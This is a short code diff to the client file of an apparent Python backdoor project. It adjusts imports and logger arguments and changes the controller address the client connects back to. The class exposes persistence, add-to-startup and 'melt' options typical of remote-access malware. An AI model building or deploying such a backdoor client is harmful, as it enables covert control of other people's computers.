@@ -5,10 +5,10 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
 import socket
-import sys
 
+import path_wrapper
+from src.args import Args
 from src import errors
 from src.client import persistence
 from src.client.socket import Socket
@@ -17,7 +17,8 @@ import logger
 
 class Client:
     def __init__(self, host, port, is_host_name=False, add_to_startup=False, melt=False):
-        logger.init()
+        self._args = Args(self)
+        logger.init(self._args.get_args())
 
         self.socket = None
 
@@ -52,4 +53,5 @@ class Client:
             self.start()
 
 
-if __name__ == "__main__": Client('192.168.10.37', 3000, False, False, False).start()
+if __name__ == "__main__": 
+    Client('127.0.0.1', 3000, False, False, False).start()
